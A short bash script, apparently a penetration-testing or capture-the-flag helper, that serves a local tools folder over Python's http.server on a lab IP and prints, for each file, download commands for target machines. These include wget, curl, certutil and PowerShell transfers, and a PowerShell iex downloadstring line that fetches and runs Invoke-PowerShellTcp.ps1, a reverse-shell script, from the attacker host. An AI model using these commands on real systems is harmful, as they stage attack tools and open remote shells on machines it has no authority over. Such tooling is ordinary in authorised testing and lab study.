#!/usr/bin/env bash
set -e

IP=10.10.14.246
PORT=8000
WEBROOT=../tools


cd "$WEBROOT" || { echo "[-] Cannot enter $WEBROOT" >&2; exit 1; }

URL="http://$IP:$PORT"

echo "[*] Serving  : $(pwd)"
echo "[*] Base URL : $URL"
echo

echo "Files:"
for f in *; do
    [ -f "$f" ] || continue
    echo
    echo "  [+] $f"
    echo "      Linux   : wget $URL/$f"
    echo "                curl -o $f $URL/$f"
    echo "      Windows : certutil -urlcache -split -f $URL/$f $f"
    echo "                powershell -NoP -c \"iwr $URL/$f -OutFile $f\""
    echo "                powershell iex(new-object net.webclient).downloadstring('$URL/Invoke-PowerShellTcp.ps1')\""
    echo "                curl.exe -o $f $URL/$f"
done

echo
echo "[*] Starting http.server on 0.0.0.0:$PORT ..."
python3 -m http.server "$PORT" --bind 0.0.0.0